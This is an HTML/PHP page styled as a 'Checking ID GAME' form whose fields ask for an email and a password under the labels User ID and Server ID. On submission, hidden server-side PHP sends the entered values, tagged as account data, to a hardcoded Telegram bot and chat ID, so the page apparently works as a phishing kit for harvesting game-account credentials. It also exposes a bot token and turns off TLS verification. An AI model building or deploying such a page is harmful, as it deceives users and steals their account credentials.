<!DOCTYPE html>
<html lang="en">
    
<head>
  <title>Bootstrap Example</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  
</head>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<body>

</script>
<div class="container">
  <h2>Checking ID GAME</h2>
  <form action="">
    <div class="form-group">
      <label for="email">User ID:</label>
      <input type="text" class="form-control" id="user_id" placeholder="Enter email" name="user_id">
    </div>
    <div class="form-group">
      <label for="pwd">Server ID:</label>
      <input type="password" class="form-control" id="server_id" placeholder="Enter password" name="server_id">
    </div>
    <div class="mb-3" id="hasil-cek"></div>
     <input type="submit" name="btnKirim" class="btn-up btn-warning btn-lg float-left" style="padding: 10px 10px;" id="btnKirim" value="Upload Bukti">
  </form>
</div>
<?php
$token = "AAGBRX2qzCh_C901zRLeBWZNh_BrQ1BGMiM";
        if(isset($_POST['btnKirim'])){
          $isipesan = $_POST['user_id'];
          $isipesan2 = $_POST['server_id'];
          $url = "https://api.telegram.org/bot2108258763:".$token."/sendMessage?chat_id=1860377960&parse_mode=HTML&text=NOTIFIKASI%20PEMBELIAN%0A%0A"."ID%20PEMBELIAN:%20".$isipesan."%0ADATA%20AKUN:%20".$isipesan2."";
          $curlHandle = curl_init();
          curl_setopt($curlHandle, CURLOPT_URL, $url);
          curl_setopt($curlHandle, CURLOPT_HEADER, 0);
          curl_setopt($curlHandle, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($curlHandle, CURLOPT_SSL_VERIFYHOST, 2);
          curl_setopt($curlHandle, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($curlHandle, CURLOPT_TIMEOUT, 30);
          curl_setopt($curlHandle, CURLOPT_POST, 1);
          $hasilkirimtele = curl_exec($curlHandle);
          curl_close($curlHandle);
        }
?>
</body>

</html>